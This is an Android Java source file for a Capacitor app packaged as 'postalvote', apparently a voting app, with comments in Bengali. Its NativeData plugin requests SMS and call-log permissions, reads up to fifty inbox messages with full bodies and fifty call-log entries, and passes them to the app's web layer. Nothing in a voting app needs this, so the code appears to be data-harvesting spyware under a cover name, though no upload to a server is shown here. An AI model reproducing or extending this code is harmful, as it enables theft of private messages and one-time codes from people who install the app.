package com.postalvote.app;

import android.Manifest;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import com.getcapacitor.BridgeActivity;
import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.getcapacitor.annotation.Permission;
import com.getcapacitor.PermissionState; // এই লাইনটি মিসিং ছিল

public class MainActivity extends BridgeActivity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        registerPlugin(NativeDataPlugin.class);
        super.onCreate(savedInstanceState);
    }
}

@CapacitorPlugin(
    name = "NativeData",
    permissions = {
        @Permission(strings = { Manifest.permission.READ_SMS }, alias = "sms"),
        @Permission(strings = { Manifest.permission.READ_CALL_LOG }, alias = "calls")
    }
)
class NativeDataPlugin extends Plugin {

    @PluginMethod
    public void getSMS(PluginCall call) {
        if (getPermissionState("sms") != PermissionState.GRANTED) {
            requestPermissionForAlias("sms", call, "permCallback");
            return;
        }
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContext().getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String from = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    sb.append("From: ").append(from).append("\nMsg: ").append(body).append("\n---\n");
                    count++;
                } while (cursor.moveToNext() && count < 50);
                cursor.close();
            }
            JSObject res = new JSObject();
            res.put("data", sb.toString());
            call.resolve(res);
        } catch (Exception e) {
            call.reject("Error: " + e.getMessage());
        }
    }

    @PluginMethod
    public void getCalls(PluginCall call) {
        if (getPermissionState("calls") != PermissionState.GRANTED) {
            requestPermissionForAlias("calls", call, "permCallback");
            return;
        }
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String num = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    if(name == null) name = "Unknown";
                    sb.append("Name: ").append(name).append("\nNum: ").append(num).append("\n---\n");
                    count++;
                } while (cursor.moveToNext() && count < 50);
                cursor.close();
            }
            JSObject res = new JSObject();
            res.put("data", sb.toString());
            call.resolve(res);
        } catch (Exception e) {
            call.reject("Error: " + e.getMessage());
        }
    }

    @PluginMethod
    public void permCallback(PluginCall call) {
        // পারমিশন রেজাল্ট হ্যান্ডল করা হচ্ছে
        call.resolve();
    }
}
